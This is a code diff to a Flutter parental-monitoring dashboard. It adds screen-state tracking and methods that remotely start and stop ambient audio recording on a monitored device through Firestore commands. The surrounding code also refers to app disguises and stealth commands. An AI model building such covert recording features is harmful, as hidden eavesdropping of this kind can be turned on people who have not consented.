@@ -158,6 +158,7 @@ class ParentDashboardProvider extends ChangeNotifier {
               isOnline: data['isOnline'] as bool? ?? _children[idx].isOnline,
               locationAddress: data['locationAddress'] ?? _children[idx].locationAddress,
               selectedDisguise: data['selectedDisguise'] ?? _children[idx].selectedDisguise,
+              isScreenOn: data['isScreenOn'] as bool? ?? _children[idx].isScreenOn,
             );
             notifyListeners();
           }
@@ -921,6 +922,34 @@ class ParentDashboardProvider extends ChangeNotifier {
       debugPrint("Could not dispatch stealth guard command: $e");
     }
     notifyListeners();
+  }
+
+  void triggerAmbientAudioRecording() {
+    try {
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
+        'action': 'START_AMBIENT_RECORDING',
+        'payload': {},
+        'status': 'PENDING',
+        'timestamp': FieldValue.serverTimestamp(),
+      });
+      debugPrint("Dispatched START_AMBIENT_RECORDING to child device");
+    } catch (e) {
+      debugPrint("Could not dispatch start ambient recording: $e");
+    }
+  }
+
+  void stopAmbientAudioRecording() {
+    try {
+      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
+        'action': 'STOP_AMBIENT_RECORDING',
+        'payload': {},
+        'status': 'PENDING',
+        'timestamp': FieldValue.serverTimestamp(),
+      });
+      debugPrint("Dispatched STOP_AMBIENT_RECORDING to child device");
+    } catch (e) {
+      debugPrint("Could not dispatch stop ambient recording: $e");
+    }
   }
 
   bool _isGeofenceEnabled = false; // Default OFF so child is never locked or restricted unexpectedly
